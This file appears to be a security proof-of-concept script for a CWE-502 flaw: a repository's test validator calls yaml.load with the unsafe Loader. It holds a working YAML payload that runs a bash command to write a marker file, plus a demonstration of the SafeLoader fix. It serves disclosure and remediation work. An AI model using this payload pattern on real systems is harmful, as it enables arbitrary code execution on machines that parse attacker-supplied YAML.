# SPDX-FileCopyrightText: Copyright (c) 2024-2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0
#
# PoC-002: Arbitrary Code Execution via unsafe yaml.load()
#
# Vulnerability:
#   File: tests/integration/defs/test_list_validation.py:52
#   Code: test_db_data = yaml.load(f, Loader=yaml.Loader)
#
# Impact: CRITICAL - Remote Code Execution
# CWE-502: Deserialization of Untrusted Data
#
# Description:
#   PyYAML's full Loader (yaml.Loader / yaml.UnsafeLoader) supports arbitrary
#   Python object instantiation via the "!!python/object/apply:" tag. Any caller
#   that passes a malicious YAML file to test_list_validation.py will have that
#   file's embedded Python code executed in the process.
#
#   In CI the test_list files come from the repository itself (trusted), but the
#   vulnerability becomes exploitable if:
#     1. An attacker can modify a .yml file in tests/integration/test_lists/
#        (e.g. via a PR with a supply-chain compromise or a compromised contributor).
#     2. Any other code-path passes untrusted YAML to the same loader.
#
# Running this PoC:
#   python security/pocs/poc_002_yaml_unsafe_load_rce.py
#
#   Expected output:
#     [*] Demonstrating unsafe yaml.Loader deserialization
#     [*] Safe payload with SafeLoader: {'key': 'value'}
#     [!] VULNERABLE: yaml.Loader executed: /tmp/poc_002_pwned.txt
#     [+] File /tmp/poc_002_pwned.txt contains: YAML_RCE_POC_002
#     [*] Recommended fix applied (SafeLoader): <yaml.SafeLoader ...>
#
# No network access required; no external dependencies beyond PyYAML.

import os
import tempfile
import yaml


# --------------------------------------------------------------------------- #
# Payload YAML: uses !!python/object/apply to run os.system()                 #
# --------------------------------------------------------------------------- #

SAFE_YAML = """\
key: value
nested:
  - item1
  - item2
"""

# The payload writes a marker file to prove code execution.
# In a real attack this would be a reverse shell, credential dump, etc.
MARKER_FILE = "/tmp/poc_002_pwned.txt"

MALICIOUS_YAML = f"""\
!!python/object/apply:subprocess.check_output
- - bash
  - -c
  - "echo YAML_RCE_POC_002 > {MARKER_FILE}"
"""


def demonstrate_safe_load():
    """SafeLoader raises an exception on the malicious payload."""
    print("[*] Demonstrating unsafe yaml.Loader deserialization")

    # 1. Safe baseline
    result = yaml.load(SAFE_YAML, Loader=yaml.SafeLoader)
    print(f"[*] Safe payload with SafeLoader: {result}")

    return result


def demonstrate_unsafe_load():
    """yaml.Loader silently executes the embedded command."""
    # Remove marker if it exists from a previous run
    if os.path.exists(MARKER_FILE):
        os.remove(MARKER_FILE)

    try:
        # This mirrors the vulnerable line in test_list_validation.py:52
        yaml.load(MALICIOUS_YAML, Loader=yaml.Loader)  # noqa: S506
    except Exception as exc:
        # Execution still happened even if yaml.load itself raises afterwards
        print(f"[*] yaml.load raised (expected): {exc}")

    if os.path.exists(MARKER_FILE):
        with open(MARKER_FILE) as fh:
            contents = fh.read().strip()
        print(f"[!] VULNERABLE: yaml.Loader executed: {MARKER_FILE}")
        print(f"[+] File {MARKER_FILE} contains: {contents}")
        return True
    else:
        print("[-] Marker file not created — environment may have restricted subprocess.")
        return False


def demonstrate_fix():
    """yaml.SafeLoader raises ConstructorError instead of executing code."""
    try:
        yaml.load(MALICIOUS_YAML, Loader=yaml.SafeLoader)
        print("[-] Unexpected: SafeLoader did not raise!")
    except yaml.constructor.ConstructorError as exc:
        print(f"[+] FIXED: SafeLoader correctly rejected the payload: {type(exc).__name__}")
    print(f"[*] Recommended fix applied (SafeLoader): {yaml.SafeLoader}")


# --------------------------------------------------------------------------- #
# Show how the vulnerable code path in test_list_validation.py looks           #
# --------------------------------------------------------------------------- #

def simulate_vulnerable_code_path(yaml_path: str):
    """
    Mirrors the vulnerable code from:
      tests/integration/defs/test_list_validation.py:52
    """
    with open(yaml_path) as f:
        # VULNERABLE: uses yaml.Loader instead of yaml.SafeLoader
        test_db_data = yaml.load(f, Loader=yaml.Loader)  # noqa: S506
    return test_db_data


def main():
    demonstrate_safe_load()
    demonstrate_unsafe_load()
    demonstrate_fix()

    # Simulate the exact vulnerable path with a temporary file
    print("\n[*] Simulating test_list_validation.py code path with temp file...")
    with tempfile.NamedTemporaryFile(mode='w', suffix='.yml',
                                    delete=False) as tmp:
        tmp.write(MALICIOUS_YAML)
        tmp_path = tmp.name

    try:
        # Remove marker first
        if os.path.exists(MARKER_FILE):
            os.remove(MARKER_FILE)

        simulate_vulnerable_code_path(tmp_path)

        if os.path.exists(MARKER_FILE):
            print(f"[!] CONFIRMED RCE via simulated test_list_validation.py path: {MARKER_FILE}")
        else:
            print("[-] Marker not created in simulated path.")
    finally:
        os.unlink(tmp_path)

    print("\n=== REMEDIATION ===")
    print("Replace in tests/integration/defs/test_list_validation.py:52:")
    print("  BEFORE: yaml.load(f, Loader=yaml.Loader)")
    print("  AFTER:  yaml.safe_load(f)  # or yaml.load(f, Loader=yaml.SafeLoader)")


if __name__ == "__main__":
    main()
